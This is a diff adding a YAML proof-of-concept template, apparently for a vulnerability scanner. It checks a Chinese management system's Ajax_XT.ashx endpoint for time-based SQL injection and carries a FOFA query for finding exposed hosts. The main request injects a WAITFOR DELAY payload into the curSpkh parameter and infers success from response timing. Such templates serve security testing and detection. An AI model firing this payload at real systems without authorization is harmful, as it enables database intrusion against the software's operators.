@@ -1,0 +1,19 @@
+id: poc-yaml-jiu-jia-yi-ms-ajax-xt-ashx-sqli
+info:
+  name: 九佳易管理系统 Ajax_XT.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 九佳易管理系统
+  fofa: title="VSQL" && body="/Scripts/Login_A8/"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /Service/Ajax_XT.ashx
+  expression: status_code == 500 && contains(body,"未将对象引用设置到对象的实例") && contains(body,"应用程序中的服务器错误")
+- method: GET
+  path: /Service/Ajax_XT.ashx?curFlag=PicSord&curPxbh=1%2c2&curSpkh=1'WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 200 && body == "0" && duration > t1 && duration < t2
+transport: http
